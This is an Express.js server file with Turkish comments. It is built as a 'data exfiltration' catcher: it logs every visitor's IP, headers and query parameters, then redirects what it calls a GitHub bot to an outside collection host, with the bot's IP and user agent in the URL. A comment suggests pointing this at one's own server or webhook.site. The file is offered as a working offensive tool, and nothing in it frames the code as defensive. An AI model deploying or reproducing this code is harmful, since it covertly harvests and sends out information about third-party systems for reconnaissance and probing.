const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// Body parser middleware'leri
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Gelen tüm istekleri detaylıca loglayan middleware
app.use((req, res, next) => {
    const timestamp = new Date().toISOString();
    const clientIp = req.headers['cf-connecting-ip'] || req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    console.log('\n' + '='.repeat(50));
    console.log(`[${timestamp}] YENİ İSTEK YAKALANDI! 🚀`);
    console.log('='.repeat(50));
    console.log(`Method     : ${req.method}`);
    console.log(`URL        : ${req.url}`);
    console.log(`Real IP    : ${clientIp}`);
    console.log(`User-Agent : ${req.headers['user-agent'] || 'Bilinmiyor'}`);
    console.log('--- TÜM HEADERS ---');
    console.log(JSON.stringify(req.headers, null, 2));
    
    if (Object.keys(req.query).length > 0) {
        console.log('--- QUERY PARAMETRELERİ ---');
        console.log(JSON.stringify(req.query, null, 2));
    }
    console.log('-'.repeat(50));
    
    next();
});

// ==========================================
// VERİ SIZDIRMA (DATA EXFILTRATION) ENDPOINT'İ
// ==========================================
app.all('/', (req, res) => {
    const clientIp = req.headers['cf-connecting-ip'] || req.headers['x-forwarded-for'] || 'bilinmiyor';
    const userAgent = req.headers['user-agent'] || 'bilinmiyor';

    // GitHub botunun bilgilerini query parametreleri olarak hedef URL'e ekliyoruz
    // Not: Buradaki hedefi kendi dış sunucuna veya loglama servisine (örn. webhook.site) çevirebilirsin
    const targetUrl = `https://collab-wrud.onrender.com?bot_ip=${encodeURIComponent(clientIp)}&ua=${encodeURIComponent(userAgent)}`;
    
    console.log(`[!] Veri sızdırma yönlendirmesi ➔ ${targetUrl}`);
    
    // 302 Found ile botu yönlendir
    return res.redirect(302, targetUrl);
});

// Sunucuyu başlat
app.listen(PORT, () => {
    console.log(`🔥 Veri sızdırma avcısı ${PORT} portunda devrede!`);
});
